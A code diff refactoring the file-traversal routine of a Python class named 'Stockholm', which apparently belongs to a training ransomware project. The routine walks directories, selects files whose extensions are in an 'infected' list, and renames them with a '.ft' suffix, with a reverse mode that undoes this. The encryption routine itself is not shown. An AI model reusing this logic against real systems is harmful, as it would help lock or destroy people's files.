@@ -124,24 +124,24 @@ class Stockholm():
         paths: list[Path] = []
         try:
             paths = root.iterdir()
+            for child in paths:
+                if child.is_dir():
+                    self.iter_files(child)
+                elif self.reverse and child.is_file() and child.suffix == ".ft":
+                    try:
+                        new_path = child.parent / Path(child.stem)
+                        self.change_file(child, new_path)
+                    except Exception:
+                        continue
+                elif not self.reverse and child.is_file() and child.suffix != ".ft" and child.suffix in INFECTED_EXTENSION:
+                    try:
+                        new_path = child.with_suffix(''.join(child.suffixes) + '.ft')
+                        self.change_file(child, new_path)
+                    except Exception:
+                        continue
         except Exception as err:
             print (f"{paths} : {err}")
             return
-        for child in paths:
-            if child.is_dir():
-                self.iter_files(child)
-            elif self.reverse and child.is_file() and child.suffix == ".ft":
-                try:
-                    new_path = child.parent / Path(child.stem)
-                    self.change_file(child, new_path)
-                except Exception:
-                    continue
-            elif not self.reverse and child.is_file() and child.suffix != ".ft" and child.suffix in INFECTED_EXTENSION:
-                try:
-                    new_path = child.with_suffix(''.join(child.suffixes) + '.ft')
-                    self.change_file(child, new_path)
-                except Exception:
-                    continue
 
 
     def run(self):
